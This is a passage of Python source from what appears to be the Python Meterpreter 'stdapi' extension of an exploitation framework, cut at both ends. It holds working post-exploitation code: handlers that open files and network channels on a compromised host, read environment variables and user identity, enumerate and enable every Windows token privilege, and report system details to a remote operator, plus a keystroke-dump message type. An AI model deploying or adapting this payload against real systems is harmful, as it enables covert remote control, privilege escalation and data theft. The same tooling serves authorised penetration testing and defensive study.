TLV_TYPE_REGISTER_NAME         = TLV_META_TYPE_STRING  | 2540
TLV_TYPE_REGISTER_SIZE         = TLV_META_TYPE_UINT    | 2541
TLV_TYPE_REGISTER_VALUE_32     = TLV_META_TYPE_UINT    | 2542
TLV_TYPE_REGISTER              = TLV_META_TYPE_GROUP   | 2550

TLV_TYPE_TERMINAL_ROWS         = TLV_META_TYPE_UINT    | 2600
TLV_TYPE_TERMINAL_COLUMNS      = TLV_META_TYPE_UINT    | 2601

##
# Ui
##
TLV_TYPE_IDLE_TIME             = TLV_META_TYPE_UINT    | 3000
TLV_TYPE_KEYS_DUMP             = TLV_META_TYPE_STRING  | 3001

TLV_TYPE_DESKTOP               = TLV_META_TYPE_GROUP   | 3004
TLV_TYPE_DESKTOP_SESSION       = TLV_META_TYPE_UINT    | 3005
TLV_TYPE_DESKTOP_STATION       = TLV_META_TYPE_STRING  | 3006
TLV_TYPE_DESKTOP_NAME          = TLV_META_TYPE_STRING  | 3007

##
# Event Log
##
TLV_TYPE_EVENT_SOURCENAME      = TLV_META_TYPE_STRING  | 4000
TLV_TYPE_EVENT_HANDLE          = TLV_META_TYPE_QWORD   | 4001
TLV_TYPE_EVENT_NUMRECORDS      = TLV_META_TYPE_UINT    | 4002

TLV_TYPE_EVENT_READFLAGS       = TLV_META_TYPE_UINT    | 4003
TLV_TYPE_EVENT_RECORDOFFSET    = TLV_META_TYPE_UINT    | 4004

TLV_TYPE_EVENT_RECORDNUMBER    = TLV_META_TYPE_UINT    | 4006
TLV_TYPE_EVENT_TIMEGENERATED   = TLV_META_TYPE_UINT    | 4007
TLV_TYPE_EVENT_TIMEWRITTEN     = TLV_META_TYPE_UINT    | 4008
TLV_TYPE_EVENT_ID              = TLV_META_TYPE_UINT    | 4009
TLV_TYPE_EVENT_TYPE            = TLV_META_TYPE_UINT    | 4010
TLV_TYPE_EVENT_CATEGORY        = TLV_META_TYPE_UINT    | 4011
TLV_TYPE_EVENT_STRING          = TLV_META_TYPE_STRING  | 4012
TLV_TYPE_EVENT_DATA            = TLV_META_TYPE_RAW     | 4013

##
# Power
##
TLV_TYPE_POWER_FLAGS           = TLV_META_TYPE_UINT    | 4100
TLV_TYPE_POWER_REASON          = TLV_META_TYPE_UINT    | 4101

##
# Sys
##
PROCESS_EXECUTE_FLAG_HIDDEN = (1 << 0)
PROCESS_EXECUTE_FLAG_CHANNELIZED = (1 << 1)
PROCESS_EXECUTE_FLAG_SUSPENDED = (1 << 2)
PROCESS_EXECUTE_FLAG_USE_THREAD_TOKEN = (1 << 3)
PROCESS_EXECUTE_FLAG_SUBSHELL         = (1 << 6)
PROCESS_EXECUTE_FLAG_PTY              = (1 << 7)

PROCESS_ARCH_UNKNOWN = 0
PROCESS_ARCH_X86 = 1
PROCESS_ARCH_X64 = 2
PROCESS_ARCH_IA64 = 3

##
# Errors
##
ERROR_SUCCESS = 0
# not defined in original C implementation
ERROR_FAILURE = 1

ERROR_INSUFFICIENT_BUFFER = 0x0000007a
ERROR_NOT_SUPPORTED = 0x00000032
ERROR_NO_DATA = 0x000000e8
ERROR_INVALID_PARAMETER = 87

# Special return value to match up with Windows error codes for network
# errors.
ERROR_CONNECTION_ERROR = 10000

# Windows Constants
GAA_FLAG_SKIP_ANYCAST             = 0x0002
GAA_FLAG_SKIP_MULTICAST           = 0x0004
GAA_FLAG_INCLUDE_PREFIX           = 0x0010
GAA_FLAG_SKIP_DNS_SERVER          = 0x0080
LOCALE_SISO639LANGNAME            = 0x0059
LOCALE_SISO3166CTRYNAME           = 0x005A
PROCESS_TERMINATE                 = 0x0001
PROCESS_VM_READ                   = 0x0010
PROCESS_QUERY_INFORMATION         = 0x0400
PROCESS_QUERY_LIMITED_INFORMATION = 0x1000
PROCESS_ALL_ACCESS                = 0x1fffff
VER_NT_WORKSTATION                = 0x0001
VER_NT_DOMAIN_CONTROLLER          = 0x0002
VER_NT_SERVER                     = 0x0003
VER_PLATFORM_WIN32s               = 0x0000
VER_PLATFORM_WIN32_WINDOWS        = 0x0001
VER_PLATFORM_WIN32_NT             = 0x0002

# Token Constants
TOKEN_ASSIGN_PRIMARY              = 0x0001
TOKEN_DUPLICATE                   = 0x0002
TOKEN_IMPERSONATE                 = 0x0004
TOKEN_QUERY                       = 0x0008
TOKEN_QUERY_SOURCE                = 0x0010
TOKEN_ADJUST_PRIVILEGES           = 0x0020
TOKEN_ADJUST_GROUPS               = 0x0040
TOKEN_ADJUST_DEFAULT              = 0x0080
TOKEN_ADJUST_SESSIONID            = 0x0100
TOKEN_ALL_ACCESS                  = 0xf01ff

# Privilege Constants
DISABLED                          = 0x0
SE_PRIVILEGE_ENABLED_BY_DEFAULT   = 0x1
SE_PRIVILEGE_ENABLED              = 0x2
SE_PRIVILEGE_REMOVED              = 0x4
SE_PRIVILEGE_USED_FOR_ACCESS      = 0x800000000

# Windows Access Controls
MAXIMUM_ALLOWED                   = 0x02000000

WIN_AF_INET  = 2
WIN_AF_INET6 = 23

UNIVERSAL_NAME_INFO_LEVEL = 1

DRIVE_REMOTE = 4

# Linux Constants
RT_TABLE_MAIN = 254
RTA_UNSPEC = 0
RTA_DST = 1
RTA_SRC = 2
RTA_IIF = 3
RTA_OIF = 4
RTA_GATEWAY = 5
RTA_PRIORITY = 6
RTA_PREFSRC = 7
RTA_METRICS = 8
RTA_MULTIPATH = 9
RTA_PROTOINFO = 10 #/* no longer used */
RTA_FLOW = 11
RTA_CACHEINFO = 12
RTA_SESSION = 13 #/* no longer used */
RTA_MP_ALGO = 14 #/* no longer used */
RTA_TABLE = 15
RTM_GETLINK   = 18
RTM_GETADDR   = 22
RTM_GETROUTE  = 26

IFLA_ADDRESS   = 1
IFLA_BROADCAST = 2
IFLA_IFNAME    = 3
IFLA_MTU       = 4

IFA_ADDRESS    = 1
IFA_LABEL      = 3

meterpreter.register_extension('stdapi')

# Meterpreter register function decorators
register_function = meterpreter.register_function
def register_function_if(condition):
    if condition:
        return meterpreter.register_function
    else:
        return lambda function: function

def byref_at(obj, offset=0):
    address = ctypes.addressof(obj) + offset
    return ctypes.pointer(type(obj).from_address(address))

def bytes_to_ctarray(bytes_):
    ctarray = (ctypes.c_byte * len(bytes_))()
    ctypes.memmove(ctypes.byref(ctarray), bytes_, len(bytes_))
    return ctarray

def calculate_32bit_netmask(bits):
    if bits == 32:
        netmask = 0xffffffff
    else:
        netmask = ((0xffffffff << (32 - (bits % 32))) & 0xffffffff)
    return struct.pack('!I', netmask)

def calculate_128bit_netmask(bits):
    part = calculate_32bit_netmask(bits)
    part = struct.unpack('!I', part)[0]
    if bits >= 96:
        netmask = struct.pack('!iiiI', -1, -1, -1, part)
    elif bits >= 64:
        netmask = struct.pack('!iiII', -1, -1, part, 0)
    elif bits >= 32:
        netmask = struct.pack('!iIII', -1, part, 0, 0)
    else:
        netmask = struct.pack('!IIII', part, 0, 0, 0)
    return netmask

def ctarray_to_bytes(ctarray):
    if not len(ctarray):
        # work around a bug in v3.1 & v3.2 that results in a segfault when len(ctarray) == 0
        return bytes()
    bytes_ = buffer(ctarray) if sys.version_info[0] < 3 else bytes(ctarray)
    return bytes_[:]

def ctstruct_pack(structure):
    return ctypes.string_at(ctypes.byref(structure), ctypes.sizeof(structure))

def ctstruct_unpack(structure, raw_data):
    if not isinstance(structure, ctypes.Structure):
        structure = structure()
    ctypes.memmove(ctypes.byref(structure), raw_data, ctypes.sizeof(structure))
    return structure

def get_process_output(args):
    proc_h = subprocess.Popen(args, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    stdout, stderr = proc_h.communicate()

    if proc_h.wait():
        raise Exception(args[0] + ' exited with non-zero status')
    return str(stdout)

def get_stat_buffer(path):
    si = os.stat(path)
    rdev = 0
    # Older versions of Python on Windows return invalid/negative values for st_rdev - skip it entirely
    # https://github.com/python/cpython/commit/a10c1f221a5248cedf476736eea365e1dfc84910#diff-b419a047f587ec3afef8493e19dbfc142624bf278f3298bfc74729abd89e311d
    if hasattr(si, 'st_rdev') and not sys.platform.startswith('win'):
        rdev = si.st_rdev
    st_buf = struct.pack('<III', int(si.st_dev), int(si.st_mode), int(si.st_nlink))
    st_buf += struct.pack('<IIIQ', int(si.st_uid), int(si.st_gid), int(rdev), long(si.st_ino))
    st_buf += struct.pack('<QQQQ', long(si.st_size), long(si.st_atime), long(si.st_mtime), long(si.st_ctime))
    return st_buf

def get_token_user_sid(handle):
    TokenUser = 1
    advapi32 = ctypes.windll.advapi32
    advapi32.OpenProcessToken.argtypes = [ctypes.c_void_p, ctypes.c_uint32, ctypes.POINTER(ctypes.c_void_p)]

    token_handle = ctypes.c_void_p()
    if not advapi32.OpenProcessToken(handle, TOKEN_QUERY, ctypes.byref(token_handle)):
        return None
    token_user_buffer = (ctypes.c_byte * 4096)()
    dw_returned = ctypes.c_uint32()
    result = advapi32.GetTokenInformation(token_handle, TokenUser, ctypes.byref(token_user_buffer), ctypes.sizeof(token_user_buffer), ctypes.byref(dw_returned))
    ctypes.windll.kernel32.CloseHandle(token_handle)
    if not result:
        return None
    token_user = ctstruct_unpack(TOKEN_USER, token_user_buffer)

    GetLengthSid = ctypes.windll.advapi32.GetLengthSid
    GetLengthSid.argtypes = [ctypes.c_void_p]
    GetLengthSid.restype = ctypes.c_uint32
    sid_length = GetLengthSid(token_user.User.Sid)
    sid_bytes = ctypes.string_at(token_user.User.Sid, sid_length)

    return sid_bytes

def get_username_from_sid(sid):
    user = (ctypes.c_char * 512)()
    domain = (ctypes.c_char * 512)()
    user_len = ctypes.c_uint32()
    user_len.value = ctypes.sizeof(user)
    domain_len = ctypes.c_uint32()
    domain_len.value = ctypes.sizeof(domain)
    use = ctypes.c_ulong()
    use.value = 0
    LookupAccountSid = ctypes.windll.advapi32.LookupAccountSidA
    LookupAccountSid.argtypes = [ctypes.c_void_p] * 7
    if not LookupAccountSid(None, sid, user, ctypes.byref(user_len), domain, ctypes.byref(domain_len), ctypes.byref(use)):
        return None
    return str(ctypes.string_at(domain)) + '\\' + str(ctypes.string_at(user))

def get_windll_lang():
    if not hasattr(ctypes.windll.kernel32, 'GetSystemDefaultLangID'):
        return None
    kernel32 = ctypes.windll.kernel32
    kernel32.GetSystemDefaultLangID.restype = ctypes.c_uint16
    lang_id = kernel32.GetSystemDefaultLangID()

    size = kernel32.GetLocaleInfoW(lang_id, LOCALE_SISO3166CTRYNAME, 0, 0)
    ctry_name = (ctypes.c_wchar * size)()
    kernel32.GetLocaleInfoW(lang_id, LOCALE_SISO3166CTRYNAME, ctry_name, size)

    size = kernel32.GetLocaleInfoW(lang_id, LOCALE_SISO639LANGNAME, 0, 0)
    lang_name = (ctypes.c_wchar * size)()
    kernel32.GetLocaleInfoW(lang_id, LOCALE_SISO639LANGNAME, lang_name, size)

    if not (len(ctry_name.value) and len(lang_name)):
        return 'Unknown'
    return lang_name.value + '_' + ctry_name.value

def get_windll_os_name():
    os_info = windll_RtlGetVersion()
    if not os_info:
        return None
    is_workstation = os_info.wProductType == VER_NT_WORKSTATION
    os_name = None
    if os_info.dwMajorVersion == 3:
        os_name = 'NT 3.51'
    elif os_info.dwMajorVersion == 4:
        if os_info.dwMinorVersion == 0 and os_info.dwPlatformId == VER_PLATFORM_WIN32_WINDOWS:
            os_name = '95'
        elif os_info.dwMinorVersion == 10:
            os_name = '98'
        elif os_info.dwMinorVersion == 90:
            os_name = 'ME'
        elif os_info.dwMinorVersion == 0 and os_info.dwPlatformId == VER_PLATFORM_WIN32_NT:
            os_name = 'NT 4.0'
    elif os_info.dwMajorVersion == 5:
        if os_info.dwMinorVersion == 0:
            os_name = '2000'
        elif os_info.dwMinorVersion == 1:
            os_name = 'XP'
        elif os_info.dwMinorVersion == 2:
            os_name = '.NET Server'
    elif os_info.dwMajorVersion == 6:
        if os_info.dwMinorVersion == 0:
            os_name = ('Vista' if is_workstation else '2008')
        elif os_info.dwMinorVersion == 1:
            os_name = ('7' if is_workstation else '2008 R2')
        elif os_info.dwMinorVersion == 2:
            os_name = ('8' if is_workstation else '2012')
        elif os_info.dwMinorVersion == 3:
            os_name = ('8.1' if is_workstation else '2012 R2')
    elif os_info.dwMajorVersion == 10:
        if os_info.dwMinorVersion == 0:
            os_name = ('10' if is_workstation else '2016')

    if not os_name:
        os_name = 'Unknown'
    os_name = 'Windows ' + os_name
    if os_info.szCSDVersion:
        os_name += ' (Build ' + str(os_info.dwBuildNumber) + ', ' + os_info.szCSDVersion + ')'
    else:
        os_name += ' (Build ' + str(os_info.dwBuildNumber) + ')'
    return os_name

def getaddrinfo(host, port=0, family=0, socktype=0, proto=0, flags=0):
    addresses = []
    for info in socket.getaddrinfo(host, port, family, socktype, proto, flags):
        addresses.append({
            'family': info[0],
            'socktype': info[1],
            'proto': info[2],
            'cannonname': info[3],
            'sockaddr': info[4]
        })
    return addresses

def getaddrinfo_from_request(request, socktype, proto):
    peer_host = packet_get_tlv(request, TLV_TYPE_PEER_HOST).get('value')
    if peer_host:
        peer_port = packet_get_tlv(request, TLV_TYPE_PEER_PORT).get('value', 0)
        peer_address_info = getaddrinfo(peer_host, peer_port, socktype=socktype, proto=proto)
        peer_address_info = peer_address_info[0] if peer_address_info else None
    else:
        peer_address_info = None

    local_host = packet_get_tlv(request, TLV_TYPE_LOCAL_HOST).get('value')
    if local_host:
        local_port = packet_get_tlv(request, TLV_TYPE_LOCAL_PORT).get('value', 0)
        local_address_info = getaddrinfo(local_host, local_port, socktype=socktype, proto=proto)
        local_address_info = local_address_info[0] if local_address_info else None
    else:
        local_address_info = None
    return peer_address_info, local_address_info

def addr_atoi4(address):
    return struct.unpack('!I',  socket.inet_aton(address))[0]

def netlink_request(req_type, req_data):
    # See RFC 3549
    NLM_F_REQUEST    = 0x0001
    NLM_F_ROOT       = 0x0100
    NLM_F_MATCH      = 0x0200
    NLM_F_DUMP       = NLM_F_ROOT | NLM_F_MATCH
    NLMSG_ERROR      = 0x0002
    NLMSG_DONE       = 0x0003

    sock = socket.socket(socket.AF_NETLINK, socket.SOCK_RAW, socket.NETLINK_ROUTE)
    sock.bind((os.getpid(), 0))
    seq = int(time.time())
    if isinstance(req_data, ctypes.Structure):
        req_data = ctstruct_pack(req_data)
    nlmsg = ctstruct_pack(NLMSGHDR(len=ctypes.sizeof(NLMSGHDR) + len(req_data), type=req_type, flags=(NLM_F_REQUEST | NLM_F_DUMP), seq=seq, pid=0))
    sock.send(nlmsg + req_data)
    responses = []
    if not len(select.select([sock.fileno()], [], [], 0.5)[0]):
        return responses
    raw_response_data = sock.recv(0xfffff)
    response = ctstruct_unpack(NLMSGHDR, raw_response_data[:ctypes.sizeof(NLMSGHDR)])
    raw_response_data = raw_response_data[ctypes.sizeof(NLMSGHDR):]
    while response.type != NLMSG_DONE:
        if response.type == NLMSG_ERROR:
            debug_print('received NLMSG_ERROR from a netlink request')
            break
        response_data = raw_response_data[:(response.len - 16)]
        responses.append(response_data)
        raw_response_data = raw_response_data[len(response_data):]
        if not len(raw_response_data):
            if not len(select.select([sock.fileno()], [], [], 0.5)[0]):
                break
            raw_response_data = sock.recv(0xfffff)
        response = ctstruct_unpack(NLMSGHDR, raw_response_data[:ctypes.sizeof(NLMSGHDR)])
        raw_response_data = raw_response_data[ctypes.sizeof(NLMSGHDR):]
    sock.close()
    return responses

def resolve_host(hostname, family):
    address_info = getaddrinfo(hostname, family=family, socktype=socket.SOCK_DGRAM, proto=socket.IPPROTO_UDP)
    address = address_info[0]['sockaddr'][0]
    return {'family': family, 'address': address, 'packed_address': inet_pton(family, address)}

def tlv_pack_local_addrinfo(sock):
    local_host, local_port = sock.getsockname()[:2]
    return tlv_pack(TLV_TYPE_LOCAL_HOST, local_host) + tlv_pack(TLV_TYPE_LOCAL_PORT, local_port)

def windll_RtlGetVersion():
    if not has_windll:
        return None
    os_info = OSVERSIONINFOEXW()
    os_info.dwOSVersionInfoSize = ctypes.sizeof(OSVERSIONINFOEXW)
    if ctypes.windll.ntdll.RtlGetVersion(ctypes.byref(os_info)) != 0:
        return None
    return os_info

def windll_GetNativeSystemInfo():
    if not has_windll:
        return None
    sysinfo = SYSTEM_INFO()
    ctypes.windll.kernel32.GetNativeSystemInfo(ctypes.byref(sysinfo))
    return {0:PROCESS_ARCH_X86, 6:PROCESS_ARCH_IA64, 9:PROCESS_ARCH_X64}.get(sysinfo.wProcessorArchitecture, PROCESS_ARCH_UNKNOWN)

def windll_GetVersion():
    if not has_windll:
        return None
    dwVersion = ctypes.windll.kernel32.GetVersion()
    dwMajorVersion =  (dwVersion & 0x000000ff)
    dwMinorVersion = ((dwVersion & 0x0000ff00) >> 8)
    dwBuild        = ((dwVersion & 0xffff0000) >> 16)
    return type('Version', (object,), dict(dwMajorVersion = dwMajorVersion, dwMinorVersion = dwMinorVersion, dwBuild = dwBuild))

def enable_privilege(name, enable=True):
    GetCurrentProcess = ctypes.windll.kernel32.GetCurrentProcess
    GetCurrentProcess.restype = ctypes.c_void_p

    OpenProcessToken = ctypes.windll.advapi32.OpenProcessToken
    OpenProcessToken.argtypes = [ctypes.c_void_p, ctypes.c_uint32, ctypes.POINTER(ctypes.c_void_p)]
    OpenProcessToken.restype = ctypes.c_bool

    LookupPrivilegeValue = ctypes.windll.advapi32.LookupPrivilegeValueW
    LookupPrivilegeValue.argtypes = [ctypes.c_wchar_p, ctypes.c_wchar_p, ctypes.POINTER(LUID)]
    LookupPrivilegeValue.restype = ctypes.c_bool

    AdjustTokenPrivileges = ctypes.windll.advapi32.AdjustTokenPrivileges
    AdjustTokenPrivileges.argtypes = [ctypes.c_void_p, ctypes.c_bool, PTOKEN_PRIVILEGES, ctypes.c_uint32, PTOKEN_PRIVILEGES, ctypes.POINTER(ctypes.c_uint32)]
    AdjustTokenPrivileges.restype = ctypes.c_bool

    token = ctypes.c_void_p()
    success = OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, token)
    if not success:
        return False

    luid = LUID()
    name = ctypes.create_unicode_buffer(name)
    success = LookupPrivilegeValue(None, name, luid)
    if not success:
        return False

    size = ctypes.sizeof(TOKEN_PRIVILEGES)
    size += ctypes.sizeof(LUID_AND_ATTRIBUTES)
    buffer = ctypes.create_string_buffer(size)
    tokenPrivileges = ctypes.cast(buffer, PTOKEN_PRIVILEGES).contents
    tokenPrivileges.PrivilegeCount = 1
    tokenPrivileges.get_array()[0].Luid = luid
    tokenPrivileges.get_array()[0].Attributes = SE_PRIVILEGE_ENABLED if enable else 0
    return AdjustTokenPrivileges(token, False, tokenPrivileges, 0, None, None)

@register_function
def channel_open_stdapi_fs_file(request, response):
    fpath = packet_get_tlv(request, TLV_TYPE_FILE_PATH)['value']
    fmode = packet_get_tlv(request, TLV_TYPE_FILE_MODE)
    if fmode:
        fmode = fmode['value']
        fmode = fmode.replace('bb', 'b')
    else:
        fmode = 'rb'
    file_h = open(unicode(fpath), fmode)
    channel_id = meterpreter.add_channel(MeterpreterFile(file_h))
    response += tlv_pack(TLV_TYPE_CHANNEL_ID, channel_id)
    return ERROR_SUCCESS, response

@register_function
def channel_open_stdapi_net_tcp_client(request, response):
    peer_address_info, local_address_info = getaddrinfo_from_request(request, socktype=socket.SOCK_STREAM, proto=socket.IPPROTO_TCP)
    retries = packet_get_tlv(request, TLV_TYPE_CONNECT_RETRIES).get('value', 1)
    if not peer_address_info:
        return ERROR_CONNECTION_ERROR, response
    connected = False
    for _ in range(retries + 1):
        sock = socket.socket(peer_address_info['family'], peer_address_info['socktype'], peer_address_info['proto'])
        sock.settimeout(3.0)
        if local_address_info:
            sock.bind(local_address_info['sockaddr'])
        try:
            sock.connect(peer_address_info['sockaddr'])
            connected = True
            break
        except:
            pass
    if not connected:
        return ERROR_CONNECTION_ERROR, response
    channel_id = meterpreter.add_channel(MeterpreterSocketTCPClient(sock))
    response += tlv_pack(TLV_TYPE_CHANNEL_ID, channel_id)
    response += tlv_pack_local_addrinfo(sock)
    return ERROR_SUCCESS, response

@register_function
def channel_open_stdapi_net_tcp_server(request, response):
    use_dual_stack = False
    local_host = packet_get_tlv(request, TLV_TYPE_LOCAL_HOST).get('value', '')
    local_port = packet_get_tlv(request, TLV_TYPE_LOCAL_PORT)['value']
    if local_host:
        local_address_info = getaddrinfo(local_host, local_port, socktype=socket.SOCK_STREAM, proto=socket.IPPROTO_TCP, flags=socket.AI_NUMERICHOST)
        if not local_address_info:
            return ERROR_FAILURE, response
        local_address_info = local_address_info[0]
    else:
        local_address_info = {
            'family': socket.AF_INET6,
            'sockaddr': ('::', local_port, 0, 0)
        }
        use_dual_stack = hasattr(socket, 'IPV6_V6ONLY')
        debug_print('[*] no local host information, binding to all available interfaces...')
    server_sock = socket.socket(local_address_info['family'], socket.SOCK_STREAM, socket.IPPROTO_TCP)
    server_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    if local_address_info['family'] == socket.AF_INET6 and use_dual_stack:
        server_sock.setsockopt(socket.IPPROTO_IPV6, socket.IPV6_V6ONLY, 0)
    server_sock.bind(local_address_info['sockaddr'])
    server_sock.listen(socket.SOMAXCONN)
    channel_id = meterpreter.add_channel(MeterpreterSocketTCPServer(server_sock))
    response += tlv_pack(TLV_TYPE_CHANNEL_ID, channel_id)
    response += tlv_pack_local_addrinfo(server_sock)
    return ERROR_SUCCESS, response

@register_function
def channel_open_stdapi_net_udp_client(request, response):
    peer_address_info, local_address_info = getaddrinfo_from_request(request, socktype=socket.SOCK_DGRAM, proto=socket.IPPROTO_UDP)
    if not local_address_info:
        return ERROR_FAILURE, response
    sock = socket.socket(local_address_info['family'], local_address_info['socktype'], local_address_info['proto'])
    sock.bind(local_address_info['sockaddr'])
    peer_address = peer_address_info['sockaddr'] if peer_address_info else None
    channel_id = meterpreter.add_channel(MeterpreterSocketUDPClient(sock, peer_address))
    response += tlv_pack(TLV_TYPE_CHANNEL_ID, channel_id)
    response += tlv_pack_local_addrinfo(sock)
    return ERROR_SUCCESS, response

@register_function
def stdapi_sys_config_getenv(request, response):
    for env_var in packet_enum_tlvs(request, TLV_TYPE_ENV_VARIABLE):
        pgroup = bytes()
        env_var = env_var['value']
        env_var = env_var.replace('%', '')
        env_var = env_var.replace('$', '')
        env_val = os.environ.get(env_var)
        if env_val:
            pgroup += tlv_pack(TLV_TYPE_ENV_VARIABLE, env_var)
            pgroup += tlv_pack(TLV_TYPE_ENV_VALUE, env_val)
            response += tlv_pack(TLV_TYPE_ENV_GROUP, pgroup)
    return ERROR_SUCCESS, response

@register_function_if(has_windll)
def stdapi_sys_config_getsid(request, response):
    sid = get_token_user_sid(ctypes.windll.kernel32.GetCurrentProcess())
    if not sid:
        return error_result_windows(), response
    sid_str = ctypes.c_char_p()
    ConvertSidToStringSid = ctypes.windll.advapi32.ConvertSidToStringSidA
    ConvertSidToStringSid.argtypes = [ctypes.c_void_p, ctypes.c_void_p]
    if not ConvertSidToStringSid(sid, ctypes.byref(sid_str)):
        return error_result_windows(), response
    sid_str = str(ctypes.string_at(sid_str))
    response += tlv_pack(TLV_TYPE_SID, sid_str)
    return ERROR_SUCCESS, response

@register_function
def stdapi_sys_config_getuid(request, response):
    if has_pwd:
        username = pwd.getpwuid(os.getuid()).pw_name
    elif has_windll:
        sid = get_token_user_sid(ctypes.windll.kernel32.GetCurrentProcess())
        if not sid:
            return error_result_windows(), response
        username = get_username_from_sid(sid)
        if not username:
            return error_result_windows(), response
    else:
        username = getpass.getuser()
    response += tlv_pack(TLV_TYPE_USER_NAME, username)
    return ERROR_SUCCESS, response

@register_function_if(has_windll)
def stdapi_sys_config_getprivs(request, response):
    GetCurrentProcess = ctypes.windll.kernel32.GetCurrentProcess
    GetCurrentProcess.restype = ctypes.c_void_p

    advapi32 = ctypes.windll.advapi32
    OpenProcessToken = advapi32.OpenProcessToken
    OpenProcessToken.argtypes = [ctypes.c_void_p, ctypes.c_uint32, ctypes.POINTER(ctypes.c_void_p)]
    OpenProcessToken.restype = ctypes.c_bool

    LookupPrivilegeValue = advapi32.LookupPrivilegeValueW
    LookupPrivilegeValue.argtypes = [ctypes.c_wchar_p, ctypes.c_wchar_p, ctypes.POINTER(LUID)]
    LookupPrivilegeValue.restype = ctypes.c_bool

    AdjustTokenPrivileges = advapi32.AdjustTokenPrivileges
    AdjustTokenPrivileges.argtypes = [ctypes.c_void_p, ctypes.c_bool, PTOKEN_PRIVILEGES, ctypes.c_uint32, PTOKEN_PRIVILEGES, ctypes.POINTER(ctypes.c_uint32)]
    AdjustTokenPrivileges.restype = ctypes.c_bool

    CloseHandle = ctypes.windll.kernel32.CloseHandle
    CloseHandle.argtypes = [ctypes.c_void_p]
    CloseHandle.restype = ctypes.c_long

    token = ctypes.c_void_p()
    success = OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, token)
    if not success:
        return error_result_windows(), response

    priv_list = [
        "SeAssignPrimaryTokenPrivilege",                 # SE_ASSIGNPRIMARYTOKEN_NAME
        "SeAuditPrivilege",                              # SE_AUDIT_NAME
        "SeBackupPrivilege",                             # SE_BACKUP_NAME
        "SeChangeNotifyPrivilege",                       # SE_CHANGE_NOTIFY_NAME
        "SeCreateGlobalPrivilege",                       # SE_CREATE_GLOBAL_NAME
        "SeCreatePagefilePrivilege",                     # SE_CREATE_PAGEFILE_NAME
        "SeCreatePermanentPrivilege",                    # SE_CREATE_PERMANENT_NAME
        "SeCreateSymbolicLinkPrivilege",                 # SE_CREATE_SYMBOLIC_LINK_NAME
        "SeCreateTokenPrivilege",                        # SE_CREATE_TOKEN_NAME
        "SeDebugPrivilege",                              # SE_DEBUG_NAME
        "SeDelegateSessionUserImpersonatePrivilege",     # SE_DELEGATE_SESSION_USER_IMPERSONATE_NAME
        "SeEnableDelegationPrivilege",                   # SE_ENABLE_DELEGATION_NAME
        "SeImpersonatePrivilege",                        # SE_IMPERSONATE_NAME
        "SeIncreaseBasePriorityPrivilege",               # SE_INC_BASE_PRIORITY_NAME
        "SeIncreaseQuotaPrivilege",                      # SE_INCREASE_QUOTA_NAME
        "SeIncreaseWorkingSetPrivilege",                 # SE_INC_WORKING_SET_NAME
        "SeLoadDriverPrivilege",                         # SE_LOAD_DRIVER_NAME
        "SeLockMemoryPrivilege",                         # SE_LOCK_MEMORY_NAME
        "SeMachineAccountPrivilege",                     # SE_MACHINE_ACCOUNT_NAME
        "SeManageVolumePrivilege",                       # SE_MANAGE_VOLUME_NAME
        "SeProfileSingleProcessPrivilege",               # SE_PROF_SINGLE_PROCESS_NAME
        "SeRelabelPrivilege",                            # SE_RELABEL_NAME
        "SeRemoteShutdownPrivilege",                     # SE_REMOTE_SHUTDOWN_NAME
        "SeRestorePrivilege",                            # SE_RESTORE_NAME
        "SeSecurityPrivilege",                           # SE_SECURITY_NAME
        "SeShutdownPrivilege",                           # SE_SHUTDOWN_NAME
        "SeSyncAgentPrivilege",                          # SE_SYNC_AGENT_NAME
        "SeSystemEnvironmentPrivilege",                  # SE_SYSTEM_ENVIRONMENT_NAME
        "SeSystemProfilePrivilege",                      # SE_SYSTEM_PROFILE_NAME
        "SeSystemtimePrivilege",                         # SE_SYSTEMTIME_NAME
        "SeTakeOwnershipPrivilege",                      # SE_TAKE_OWNERSHIP_NAME
        "SeTcbPrivilege",                                # SE_TCB_NAME
        "SeTimeZonePrivilege",                           # SE_TIME_ZONE_NAME
        "SeTrustedCredManAccessPrivilege",               # SE_TRUSTED_CREDMAN_ACCESS_NAME
        "SeUndockPrivilege",                             # SE_UNDOCK_NAME
        "SeUnsolicitedInputPrivilege"                    # SE_UNSOLICITED_INPUT_NAME
    ]
    for privilege in priv_list:
        luid = LUID()
        name = ctypes.create_unicode_buffer(privilege)
        success = LookupPrivilegeValue(None, name, luid)
        if success:
            size = ctypes.sizeof(TOKEN_PRIVILEGES)
            size += ctypes.sizeof(LUID_AND_ATTRIBUTES)
            buffer = ctypes.create_string_buffer(size)
            tokenPrivileges = ctypes.cast(buffer, PTOKEN_PRIVILEGES).contents
            tokenPrivileges.PrivilegeCount = 1
            tokenPrivileges.get_array()[0].Luid = luid
            tokenPrivileges.get_array()[0].Attributes = SE_PRIVILEGE_ENABLED
            if AdjustTokenPrivileges(token, False, tokenPrivileges, 0, None, None):
                response += tlv_pack(TLV_TYPE_PRIVILEGE, privilege)
    CloseHandle(token)
    return ERROR_SUCCESS, response

@register_function
def stdapi_sys_config_localtime(request, response):
    localtime = time.strftime("%Y-%m-%d %H:%M:%S %Z", time.localtime())
    direction = "-" if time.timezone > 0 else "+"
    localtime += " (UTC{0}{1})".format(direction, int(abs(time.timezone / 36)))
    response += tlv_pack(TLV_TYPE_LOCAL_DATETIME, localtime)
    return ERROR_SUCCESS, response

@register_function
def stdapi_sys_config_sysinfo(request, response):
    uname_info = platform.uname()
    response += tlv_pack(TLV_TYPE_COMPUTER_NAME, uname_info[1])
    os_name = uname_info[0] + ' ' + uname_info[2] + ' ' + uname_info[3]
    lang = None
    if 'LANG' in os.environ:
        lang = os.environ['LANG'].split('.', 1)[0]
    if has_windll:
        os_name = get_windll_os_name() or os_name
        lang = (get_windll_lang() or lang)
    if lang:
        response += tlv_pack(TLV_TYPE_LANG_SYSTEM, lang)
    response += tlv_pack(TLV_TYPE_OS_NAME, os_name)
    response += tlv_pack(TLV_TYPE_ARCHITECTURE, get_system_arch())
    return ERROR_SUCCESS, response

@register_function_if(has_windll)
def stdapi_sys_process_attach(request, response):
    pid = packet_get_tlv(request, TLV_TYPE_PID)['value']
    if not pid:
        GetCurrentProcess = ctypes.windll.kernel32.GetCurrentProcess
        GetCurrentProcess.restype = ctypes.c_void_p
        handle = GetCurrentProcess()
    else:
        inherit = packet_get_tlv(request, TLV_TYPE_INHERIT)['value']
